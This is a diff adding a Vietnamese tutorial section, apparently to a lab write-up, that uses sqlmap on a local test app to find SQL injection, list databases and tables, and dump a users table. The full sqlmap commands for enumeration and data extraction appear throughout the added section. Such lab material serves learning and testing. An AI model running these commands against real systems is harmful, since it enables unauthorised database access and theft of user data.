@@ -284,3 +284,36 @@ $result = $stmt->get_result();
 </body>
 </html>
 ```
+# Các bước thực hiện:
+## Kiểm tra mục tiêu bằng sqlmap:
+```sudo sqlmap -u http://localhost:8088/?search=1 --dbms=mysql```
+![image](https://github.com/user-attachments/assets/2498922d-910d-465d-b663-c54e34decf71)
+
+- **sqlmap **sẽ tiến hành kiểm tra và bạn sẽ thấy các bước kiểm tra được hiển thị trong terminal. Quá trình này có thể mất một khoảng thời gian tùy thuộc vào độ phức tạp của ứng dụng và số lượng kiểm tra mà sqlmap thực hiện.
+
+- Xác định cơ sở dữ liệu và bảng:
+
+- Nếu sqlmap tìm thấy lỗ hổng, bạn có thể tiếp tục sử dụng các tùy chọn như:
+
+**--dbs** để liệt kê các cơ sở dữ liệu.
+**--tables** để liệt kê các bảng trong một cơ sở dữ liệu cụ thể.
+**--columns** để liệt kê các cột trong một bảng cụ thể.
+**--dump **để trích xuất dữ liệu từ các bảng.
+
+- Ví dụ lệnh tiếp theo:
+Liệt kê tất cả các cơ sở dữ liệu:
+
+```sudo sqlmap -u http://localhost:8088/?search=1 --dbms=mysql --dbs```
+
+Liệt kê tất cả các bảng trong cơ sở dữ liệu testdb:
+
+```sudo sqlmap -u http://localhost:8088/?search=1 --dbms=mysql -D testdb --tables```
+
+![image](https://github.com/user-attachments/assets/6966a5d6-58e0-498c-aa26-25fe73b54a5a)
+
+Trích xuất dữ liệu từ bảng users trong cơ sở dữ liệu testdb:
+
+```sudo sqlmap -u http://localhost:8088/?search=1 --dbms=mysql -D testdb -T users --dump```
+![image](https://github.com/user-attachments/assets/e9585e8f-c959-4beb-8628-f2e3977cb539)
+
+Nếu bạn gặp bất kỳ vấn đề nào trong quá trình sử dụng sqlmap, bạn có thể cung cấp thêm thông tin chi tiết, và tôi sẽ hỗ trợ bạn thêm.
